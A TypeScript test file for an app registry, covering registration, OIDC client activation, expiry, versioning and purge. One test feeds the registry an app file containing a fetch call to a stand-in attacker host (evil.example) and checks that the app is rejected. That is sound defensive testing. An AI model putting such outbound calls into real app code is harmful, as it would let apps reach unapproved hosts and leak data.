import { mkdtemp, readFile, rm, stat } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { AppRegistry, registerBody } from './apps.js';

const SDK = "// GENERATED SDK for apps — ontology sofa@4.2.0 (abc); do not edit\nexport function createClient() { return fetch('api'); }\n";
const b64 = (s: string) => Buffer.from(s).toString('base64');
const files = (over: Record<string, string> = {}) =>
  Object.fromEntries(
    Object.entries({
      'package.json': JSON.stringify({ dependencies: { react: '19.2.0', 'react-dom': '19.2.0' } }),
      'src/liquid-sdk.ts': SDK,
      'src/main.tsx': "import { createClient } from './liquid-sdk';\ncreateClient();\n",
      'dist/index.html': '<script type="module" src="./assets/a.js"></script>',
      'dist/assets/a.js': 'x',
      ...over,
    }).map(([k, v]) => [k, b64(v)]),
  );

let dir: string;
let now: number;
let clients: Map<string, { clientSecret: string; redirectUris: string[] }>;
let events: Array<{ type: string; objectId: string }>;
let reg: AppRegistry;
const input = (over: Record<string, unknown> = {}) => registerBody.parse({ id: 'supplier-dd', name: 'Supplier due diligence', owner: 'ada@example.local', actions: ['submit_due_diligence_statement'], reads: ['Supplier'], files: files(), ...over });

beforeEach(async () => {
  dir = await mkdtemp(path.join(os.tmpdir(), 'apps-'));
  now = Date.parse('2026-11-17T10:00:00Z');
  clients = new Map();
  events = [];
  reg = new AppRegistry({
    dataDir: dir,
    appsPublicUrl: 'http://localhost:8090',
    oauth: {
      upsertClient: async (c) => void clients.set(c.clientId, { clientSecret: c.clientSecret, redirectUris: c.redirectUris }),
      deleteClient: async (id) => void clients.delete(id),
    },
    ontology: async () => ({ version: '4.2.0', actions: ['submit_due_diligence_statement', 'list_suppliers'], classes: ['Supplier'], sdk: SDK }),
    events: async (e) => void events.push(...e),
    now: () => now,
  });
  await reg.load();
});
afterEach(() => rm(dir, { recursive: true, force: true }));

describe('app registry (ADR-0050)', () => {
  it('register → check passes → activate creates the OIDC client; the files are stored for the app host', async () => {
    const a = await reg.register(input(), 'admin@example.local');
    expect(a).toMatchObject({ status: 'registered', version: 1, expiresAt: '2027-05-16T10:00:00.000Z', ontologyVersion: '4.2.0' });
    expect(reg.client('supplier-dd')).toBeUndefined(); // not active yet: no sign-in possible
    const act = await reg.activate('supplier-dd', 'admin@example.local');
    expect(act.status).toBe('active');
    expect(clients.get('app-supplier-dd')?.redirectUris).toEqual(['http://localhost:8090/apps/supplier-dd/auth/callback']);
    expect(reg.client('supplier-dd')?.clientSecret).toBe(clients.get('app-supplier-dd')?.clientSecret);
    expect(await stat(path.join(reg.distDir(act), 'index.html'))).toBeTruthy();
    expect(events.map((e) => e.type)).toEqual(['AppRegistered', 'AppActivated']);
    const secrets = JSON.parse(await readFile(path.join(dir, 'liquid', 'apps-secrets.json'), 'utf8'));
    expect(Object.keys(secrets)).toEqual(['supplier-dd']);
  });

  it('expiry removes the OIDC client; extending brings it back to registered (activate again)', async () => {
    await reg.register(input({ expiresInDays: 30 }), 'admin@example.local');
    await reg.activate('supplier-dd', 'admin@example.local');
    now += 29 * 86_400_000;
    expect(await reg.tick()).toEqual([]);
    now += 2 * 86_400_000;
    expect(await reg.tick()).toEqual(['supplier-dd']);
    expect(clients.has('app-supplier-dd')).toBe(false);
    expect(reg.get('supplier-dd')?.status).toBe('expired');
    expect(reg.client('supplier-dd')).toBeUndefined();
    await expect(reg.activate('supplier-dd', 'admin@example.local')).rejects.toMatchObject({ status: 409 });
    expect((await reg.extend('supplier-dd', 180, 'admin@example.local')).status).toBe('registered');
    expect((await reg.activate('supplier-dd', 'admin@example.local')).status).toBe('active');
    expect(events.map((e) => e.type)).toContain('AppExpired');
  });

  it('an app that calls another host is rejected and cannot be activated', async () => {
    const a = await reg.register(input({ files: files({ 'src/x.ts': "fetch('https://evil.example/c')" }) }), 'admin@example.local');
    expect(a.status).toBe('rejected');
    await expect(reg.activate('supplier-dd', 'admin@example.local')).rejects.toMatchObject({ status: 409 });
    expect(clients.size).toBe(0);
  });

  it('a new version drops the client until it is activated again; disable removes the client', async () => {
    await reg.register(input(), 'admin@example.local');
    await reg.activate('supplier-dd', 'admin@example.local');
    const v2 = await reg.register(input(), 'admin@example.local');
    expect(v2).toMatchObject({ version: 2, status: 'registered' });
    expect(clients.size).toBe(0);
    await reg.activate('supplier-dd', 'admin@example.local');
    expect((await reg.disable('supplier-dd', 'admin@example.local')).status).toBe('disabled');
    expect(clients.size).toBe(0);
  });

  it('purge (uninstall with delete data): every OIDC client goes, the registry and its files are empty', async () => {
    await reg.register(input(), 'admin@example.local');
    await reg.activate('supplier-dd', 'admin@example.local');
    expect(await reg.purge()).toBe(1);
    expect(clients.size).toBe(0);
    expect(reg.list()).toEqual([]);
    await expect(stat(path.join(dir, 'liquid', 'apps'))).rejects.toThrow();
    await reg.load();
    expect(reg.list()).toEqual([]);
  });
});
